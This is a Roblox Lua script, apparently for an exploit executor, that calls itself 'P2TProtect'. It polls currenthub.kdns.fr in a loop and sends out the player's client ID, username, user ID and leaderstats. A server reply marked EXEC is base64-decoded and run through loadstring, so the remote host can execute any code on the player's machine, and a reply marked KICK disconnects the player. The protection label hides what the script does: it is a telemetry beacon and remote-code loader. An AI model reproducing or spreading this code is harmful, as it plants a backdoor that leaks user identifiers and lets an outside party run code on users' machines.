task.spawn(function()
 local HttpService=game:GetService("HttpService")
 local Players=game:GetService("Players")
 local function report(message)
  warn("[P2TProtect] "..tostring(message))
 end
 local okId,clientId=pcall(function() return game:GetService("RbxAnalyticsService"):GetClientId() end)
 clientId=okId and clientId or "x"
 local player=Players.LocalPlayer
 if not player then report("LocalPlayer unavailable"); return end
 local username=player.Name
 local uid=tostring(player.UserId)
 local execId=HttpService:GenerateGUID(false)
 local executed=false
 local function ls()
  local t={}
  pcall(function()
   local st=player:FindFirstChild("leaderstats")
   if st then for _,v in ipairs(st:GetChildren()) do table.insert(t,v.Name..":"..tostring(v.Value)) end end
  end)
  return table.concat(t,",")
 end
 while true do
  local ok,resp=pcall(function()
   return game:HttpGet("http://currenthub.kdns.fr:20011/api/ping/9337428bb5669fde"..
    "?t=7907964124fa1c1201bd961d70a8952d9d8538b5f8d8d3cf"..
    "&c="..HttpService:UrlEncode(tostring(clientId))..
    "&u="..HttpService:UrlEncode(username)..
    "&uid="..HttpService:UrlEncode(uid)..
    "&r="..HttpService:UrlEncode(execId)..
    "&ls="..HttpService:UrlEncode(ls()))
  end)
  if not ok then
   report("Request failed: "..tostring(resp))
  elseif type(resp)=="string" then
   local kind,payload=resp:match("^(%u+):(.*)$")
   if kind=="KICK" then
    report("Server rejected session: "..tostring(payload))
    pcall(function() player:Kick(tostring(payload)) end)
    break
   elseif kind=="EXEC" and not executed then
    local decoded,src=pcall(function() return HttpService:Base64Decode(payload) end)
    if not decoded or type(src)~="string" then
     report("Base64 decode failed: "..tostring(src))
    elseif type(loadstring)~="function" then
     report("loadstring is unavailable in this executor")
    else
     local compileOK,fn,compileError=pcall(loadstring,src)
     if not compileOK then
      report("Compiler threw: "..tostring(fn))
     elseif type(fn)~="function" then
      report("Compile failed: "..tostring(compileError))
     else
      executed=true
      local runOK,runError=pcall(fn)
      if not runOK then report("Runtime error: "..tostring(runError)) end
     end
    end
   end
  end
  task.wait(8)
 end
end)
